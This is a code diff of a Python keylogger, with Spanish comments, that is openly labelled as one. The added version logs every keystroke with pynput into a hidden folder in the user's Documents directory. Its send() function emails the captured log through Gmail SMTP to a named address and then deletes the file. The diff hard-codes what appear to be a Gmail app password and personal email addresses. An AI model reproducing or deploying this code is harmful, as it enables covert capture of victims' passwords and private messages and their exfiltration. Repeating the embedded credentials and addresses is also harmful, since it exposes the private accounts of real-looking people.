@@ -1,19 +1,44 @@
 import sys
-import smtplib
 import os
-import asyncio
+import smtplib
+import time
+import threading
 from pynput import keyboard as kb
 from getpass import getuser
-from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 user = getuser()
-os.makedirs(f"RUTA/keys", exist_ok = True)
-os.system(f"attrib +h RUTA/keys")
+ruta_dir = f"C:/Users/{user}/Documents/keys"
+ruta_file = f"{ruta_dir}/keys.txt"
+ruta_log = f"{ruta_dir}/log.txt"
+os.makedirs(f"{ruta_dir}", exist_ok = True)
+os.system(f"attrib +h {ruta_dir}")
 
-loop = asyncio.get_event_loop()
+def send():
+    print("Comprobando archivo")
+    if os.path.isfile(ruta_file):
+        with open(ruta_file, "r") as log:
+            contenido = log.read()
+        msg = MIMEText(contenido)
+        password = "kgvzxdmsdwsurhpx"
+        msg['From'] = "rxkeylogger@gmail.com"
+        msg['To'] = "aaronsanchezmenendez@gmail.com"
+        msg['Subject'] = "Log"
 
-def pulsa(tecla):
+        smtp = smtplib.SMTP("smtp.gmail.com: 587")
+        smtp.starttls()
+        smtp.login(msg['From'], password)
+        smtp.sendmail(msg['From'], msg['To'], msg.as_string())
+        smtp.quit()
+        os.remove(ruta_file)
+        print("Se ha enviado el contenido")
+    else:
+        print("El archivo no existe")
+
+    print("Programando la siguiente llamada a la función enviar")
+    time.sleep(10)
+
+def on_press(tecla):
     valor = str(tecla).replace("'", "")
     if valor == "Key.space":
         valor = " "
@@ -21,32 +46,25 @@ def pulsa(tecla):
         valor = "\n"
     elif valor == "Key.shift_r" or valor == "Key.shift":
         valor = ""
-    with open(f"RUTA/keys/keys", "a") as log:
-        log.write(valor)
+    try:
+        with open(f"{ruta_file}", "a") as log:
+            log.write(valor)
+    except:
+        pass
 
-async def exec():
-    while True:
-        with kb.Listener(pulsa) as escuchador:
-            escuchador.join()
-            await asyncio.sleep(60)
+def exec():
+    with kb.Listener(on_press=on_press) as escuchador:
+        escuchador.join()
 
-async def enviar():
-    while True:
-        msg = MIMEMultipart("plain")
-        password = "CONTRASEÑA_APP_GMAIL"
-        msg['From'] = "CORREO_REMITENTE"
-        msg['To'] = "CORREO_DESTINATARIO"
-        msg['Subject'] = "Log"
+try:
+    # Iniciar función exec en un hilo
+    threading.Thread(target=exec).start()
 
-        mensaje = MIMEText(open(f"RUTA/keys", "r").read(), "plain")
-        msg.attach(mensaje)
-        smtp = smtplib.SMTP("smtp.gmail.com: 587")
-        smtp.starttls()
-        smtp.login(msg['From'], password)
+    sys.stdout = open(f"{ruta_log}", "w")
 
-        smtp.sendmail(msg['From'], msg['To'], msg.as_string())
-        smtp.quit()
+    # Programar la primera llamada a la función enviar
+    threading.Thread(target=send).start()
 
-asyncio.ensure_future(exec())
-asyncio.ensure_future(enviar())
-loop.run_forever()
+    print("Iniciando el keylogger")
+except Exception as e:
+    print(f"Ha ocurrido un error: {e}")
